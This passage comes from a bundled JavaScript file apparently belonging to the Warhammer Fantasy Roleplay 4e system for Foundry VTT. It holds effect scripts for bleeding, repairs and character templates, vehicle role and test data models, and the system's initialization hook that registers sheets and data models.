Promise.all(actor.runScripts(\"preApplyCondition\", {effect, data : scriptArgs}))\n                            msg = scriptArgs.msg;\n                            damage = scriptArgs.damage;\n                            msg += await actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, minimumOne : false, suppressMsg : true})\n\n                            if (actor.status.wounds.value == 0 && !actor.hasCondition(\"unconscious\"))\n                            {\n                                await actor.addCondition(\"unconscious\")\n                                msg += \"<br>\" + game.i18n.format(\"BleedUnc\", {name: actor.prototypeToken.name })\n                            }\n\n                            if (actor.hasCondition(\"unconscious\"))\n                            {\n                                bleedingAmt = effect.conditionValue;\n                                bleedingRoll = (await new Roll(\"1d100\").roll()).total;\n                                if (bleedingRoll <= bleedingAmt * 10)\n                                {\n                                    msg += \"<br>\" + game.i18n.format(\"BleedFail\", {name: actor.prototypeToken.name}) + \" (\" + game.i18n.localize(\"Rolled\") + \" \" + bleedingRoll + \")\";\n                                    await actor.addCondition(\"dead\")\n                                }\n                                else if (bleedingRoll % 11 == 0)\n                                {\n                                    msg += \"<br>\" + game.i18n.format(\"BleedCrit\", { name: actor.prototypeToken.name } ) + \" (\" + game.i18n.localize(\"Rolled\") + bleedingRoll + \")\"\n                                    await actor.removeCondition(\"bleeding\")\n                                }\n                                else\n                                {\n                                    msg += \"<br>\" + game.i18n.localize(\"BleedRoll\") + \": \" + bleedingRoll;\n                                }\n                            }\n\n                            await Promise.all(actor.runScripts(\"applyCondition\", {effect, data : {bleedingRoll}}))\n                            if (args.suppressMessage)\n                            {\n                                let messageData = game.wfrp4e.utility.chatDataSetup(msg);\n                                messageData.speaker = {alias: this.effect.name}\n                                messageData.flavor = this.effect.name;\n                                return messageData\n                            }\n                            else\n                            {\n                                return this.script.scriptMessage(msg)\n                            }\n                            ","zUv9e0A3OEXWY9Mv":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet data = item.toObject();\ndata.system.specification.value = 9 - this.actor.system.characteristics.s.bonus\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","zXh8rgMxWoCLTxVd":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Sail';\nconst difficulty = 'challenging';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","zY4ZjY7uyKIKMYmX":"this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"fleshy-curse\"))\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\nawait test.roll();\nif (test.succeeded)\n{\n    this.effect.delete()\n}","zadppy7FEbXvgUON":" let characteristics = {\n                    \"ws\" : 5,\n                    \"bs\" : 0,\n                    \"s\" : 0,\n                    \"t\" : 0,\n                    \"i\" : 0,\n                    \"ag\" : 10,\n                    \"dex\" : 10,\n                    \"int\" : 0,\n                    \"wp\" : 0,\n                    \"fel\" : 5\n                }\n                let skills = [\"Perception\", \"Sleight of Hand\", \"Stealth (Urban)\"]\n                let skillAdvancements = [10, 10, 10]\n                let talents = [\"Criminal\", \"Etiquette (Criminals)\"]\n                let trappings = [\"Rope, 10 yards\", \"Lockpick\", \"Mask\"]\n                let items = []\n        \n                let updateObj = this.actor.toObject();\n                \n                for (let ch in characteristics)\n                {\n                    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n                }\n                \n                for (let index = 0; index < skills.length; index++)\n                {\n                    let skill = skills[index]\n                    let skillItem;\n                    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n                    if (skillItem)\n                        skillItem.system.advances.value += skillAdvancements[index]\n                    else \n                    {\n                        skillItem = await game.wfrp4e.utility.findSkill(skill)\n                        skillItem = skillItem.toObject();\n                        skillItem.system.advances.value = skillAdvancements[index];\n                        items.push(skillItem);\n                    }\n                }\n                \n                for (let talent of talents)\n                {\n                    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n                    if (talentItem)\n                    {\n                        items.push(talentItem.toObject());\n                    }\n                    else \n                    {\n                        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n                    }\n                }\n                \n                for (let trapping of trappings) \n                {\n                    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n                    if (trappingItem)\n                    {\n                        trappingItem = trappingItem.toObject()\n                \n                        equip(trappingItem)\n                \n                        items.push(trappingItem);\n                    }\n                    else \n                    {\n                        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n                    }\n                }\n              \n                \n                await this.actor.update(updateObj)\n                this.actor.createEmbeddedDocuments(\"Item\", items);\n                \n                function equip(item)\n                {\n                    if (item.type == \"armour\")\n                        item.system.worn.value = true\n                    else if (item.type == \"weapon\")\n                        item.system.equipped = true\n                    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n                        item.system.worn = true\n                }","zdGAvfL7zJ7wpYxG":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'easy';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","zi8Z3NlwVj3IfgAW":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[3].convertToApplied()]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","ziG9H5Kdb7xC3dFE":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Art\"));","zk44dFEGkylB7kW6":"        let modifier; let target = args.data.targets[0]\n        if (target.actor.details.size.value == \"tiny\")\n            modifier = 30\n        if (target.actor.details.size.value == \"ltl\")\n            modifier = 20\n        if (target.actor.details.size.value == \"sml\")\n            modifier = 10\n\t\n        args.fields.modifier += (modifier || 0); // Offset size modifier ","zkc1gIPLj0VoAONT":"let AP = args.actor.status.armour;\n\nAP[\"head\"].value += 2;\nAP[\"rArm\"].value += 2;\nAP[\"lArm\"].value += 2;\nAP[\"body\"].value += 2;\nAP[\"lLeg\"].value += 2;\nAP[\"rLeg\"].value += 2;","zphxI8VSWbNQCMBy":"args.size = \"lrg\"","zqShIJnrRReGgP94":"let {added, removed} = this.effect.getFlag(\"wfrp4e\", \"propertiesChanged\");\n\nfor(let property of (added || []))\n{\n    let hasValue = game.wfrp4e.config.propertyHasValue[property];\n    if (!args.item.system.qualities.value.find(i => i.name == property))\n    {\n        args.item.system.qualities.value.push({name : property, value : (hasValue ? 2 : null)})\n    }\n}\n\nfor(let property of (removed || []))\n{\n    args.item.system.flaws.value = args.item.system.flaws.value.filter(i => i.name != property)\n}","zsiV6XEHlCNGLLPl":"return args.skill?.name ==  game.i18n.localize(\"NAME.SetTrap\");","zsoTVkHe4nHY1M52":"this.script.scriptMessage(await this.actor.applyBasicDamage(10 + parseInt(this.effect.sourceTest.result.SL), {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP}))","ztIkD5Zt6ko9D4Ca":"args.fields.modifier -= 10","zzk2uRSFjFHB5kjw":"\n   let roll = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n   if (args.test.isFumble && roll == 1 && !args.test.result.misfire)\n  {\n          args.test.result.misfire = game.i18n.localize(\"Misfire\") + \" (Rolled 1)\"\n          args.test.result.misfireDamage = eval(parseInt(args.test.result.roll.toString().split('').pop()) + args.test.item.Damage)\n  }\n  else if (args.test.isFumble && roll != 1)\n      args.test.result.other.push(\"Misfire Roll: \" + roll)"});
    });

}

let fields$1 = foundry.data.fields;

class VehicleRoleModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.test = new fields$1.StringField();
        return schema;
    }

    isVitalFor(test) {
        return test.system.roles.vital.split(",").map(i => i.trim()).includes(this.parent.name);
    }

    async roll(actor, options={})
    {
        let skill = await this.chooseSkill(actor);
        if (skill)
        {
          let test = await actor.setupSkill(skill.name, foundry.utils.mergeObject({appendTitle : ` - ${this.parent.name}`, roleId : this.parent.id}, options));
          test.roll();
        }
    }

    async chooseSkill(actor)
    {
        let choices = this.test.split(",").map(i => i.trim());
        let skills = [];
        for(let choice of choices)
        {
            skills = skills.concat(actor.itemTypes.skill.filter(s => s.name.includes(choice)));
        }
        
        if (skills.length == 0)
        {
            return ui.notifications.error(game.i18n.localize("VEHICLE.NoSkill"))
        }

        if (choices.length == 1)
        {
            return skills[0];
        }

        else 
        {
            return (await ItemDialog.create(skills, 1, game.i18n.localize("VEHICLE.ChooseSkill")))[0];
        }
    }
}

let fields = foundry.data.fields;

class VehicleTestModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.roles = new fields.SchemaField({
            value : new fields.StringField(),
            vital : new fields.StringField()
        });
        schema.handling = new fields.BooleanField({});
        return schema;
    }

    roll()
    {
        let crewTest = new CrewTest(this.parent);
        crewTest.renderChatPrompt();
    }
}

/* -------------------------------------------- */
/*  Foundry VTT Initialization                  */
/* -------------------------------------------- */

Hooks.once("init", function () {


  // Register sheet application classes
  Actors.unregisterSheet("core", ActorSheet);
  Actors.registerSheet("wfrp4e", ActorSheetWfrp4eCharacter, { types: ["character"], makeDefault: true });
  Actors.registerSheet("wfrp4e", ActorSheetWfrp4eNPC, { types: ["npc"], makeDefault: true });
  Actors.registerSheet("wfrp4e", ActorSheetWfrp4eCreature, { types: ["creature"], makeDefault: true });
  Actors.registerSheet("wfrp4e", ActorSheetWfrp4eVehicle, { types: ["vehicle"], makeDefault: true });
  Items.unregisterSheet("core", ItemSheet);
  Items.registerSheet("wfrp4e", ItemSheetWfrp4e, { makeDefault: true });
  DocumentSheetConfig.registerSheet(RollTable, "wfrp4e", WFRPTableConfig, {makeDefault: true});
  DocumentSheetConfig.registerSheet(ActiveEffect, "wfrp4e", WFRP4eActiveEffectConfig, {makeDefault :true});
  // DocumentSheetConfig.registerSheet(JournalEntry, "wfrp4e", WFRPJournalSheet, {makeDefault :true})
  DocumentSheetConfig.registerSheet(JournalEntryPage, "wfrp4e", WFRPJournalTextPageSheet, {types: ["text"], makeDefault: true, label : "WFRP Journal Sheet (ProseMirror)"});

  CONFIG.Actor.dataModels["character"] = CharacterModel;
  CONFIG.Actor.dataModels["npc"] = NPCModel;
  CONFIG.Actor.dataModels["creature"] = CreatureModel;
  CONFIG.Actor.dataModels["vehicle"] = VehicleModel;

  CONFIG.Item.dataModels["ammunition"] = AmmunitionModel;
  CONFIG.Item.dataModels["armour"] = ArmourModel;
  CONFIG.Item.dataModels["career"] = CareerModel;
  CONFIG.Item.dataModels["container"] = ContainerModel;
  CONFIG.Item.dataModels["critical"] = CriticalModel;
  CONFIG.Item.dataModels["disease"] = DiseaseModel;
  CONFIG.Item.dataModels["injury"] = InjuryModel;
  CONFIG.Item.dataModels["money"] = MoneyModel;
  CONFIG.Item.dataModels["mutation"] = MutationModel;
  CONFIG.Item.dataModels["prayer"] = PrayerModel;
  CONFIG.Item.dataModels["psychology"] = PsychologyModel;
  CONFIG.Item.dataModels["talent"] = TalentModel;
  CONFIG.Item.dataModels["trapping"] = TrappingModel;
  CONFIG.Item.dataModels["skill"] = SkillModel;
  CONFIG.Item.dataModels["spell"] = SpellModel;
  CONFIG.Item.dataModels["trait"] = TraitModel;
  CONFIG.Item.dataModels["weapon"] = WeaponModel;
  CONFIG.Item.dataModels["vehicleMod"] = VehicleModModel;
  CONFIG.Item.dataModels["vehicleTest"] = VehicleTestModel;
  CONFIG.Item.dataModels["vehicleRole"] = VehicleRoleModel;
  CONFIG.Item.dataModels["extendedTest"] = ExtendedTestModel;
  CONFIG.Item.dataModels["cargo"] = CargoModel;

  game.wfrp4e = {
    apps: {
      ActorSheetWfrp4e,
      ActorSheetWfrp4eCharacter,
      ActorSheetWfrp4eCreature,
      ActorSheetWfrp4eNPC,
      ActorSheetWfrp4eVehicle,
      ItemSheetWfrp4e,
      CharGenWfrp4e,
      StatBlockParser,
      BrowserWfrp4e,
      ActorSettings,
      WFRPActiveEffectConfig: WFRP4eActiveEffectConfig,
      HomebrewSettings,
      CareerSelector,
      ItemProperties,
      ModuleUpdater,
      ModuleInitializer,
      ItemDialog,
      ValueDialog,
      ChargenStage
    },
    entities: {
      ActorWfrp4e,
      ItemWfrp4e
    },
    rolls : {
      TestWFRP,
      CharacteristicTest,
      SkillTest,
      WeaponTest,
      CastTest,
      WomCastTest,
      ChannelTest,
      PrayerTest,
      TraitTest
    },
    utility: WFRP_Utility,
    tables: WFRP_Tables,
    config: WFRP4E,
    chat: ChatWFRP,
    market: MarketWfrp4e,
    audio: WFRP_Audio,
    opposed: OpposedWFRP,
    opposedTest: OpposedTest,
    names: NameGenWfrp,
    combat: CombatHelpers,
    aoe: AbilityTemplate,
    migration: Migration,
    socket: SocketHandlers,
    tags : new TagManager(),
    trade : new TradeManager()
  };

  CONFIG.Actor.documentClass = ActorWfrp4e;
  CONFIG.Item.documentClass = ItemWfrp4e;
  CONFIG.ActiveEffect.documentClass = EffectWfrp4e;
  CONFIG.ActiveEffect.legacyTransferral = false;
});

registerHooks();
loadScripts();
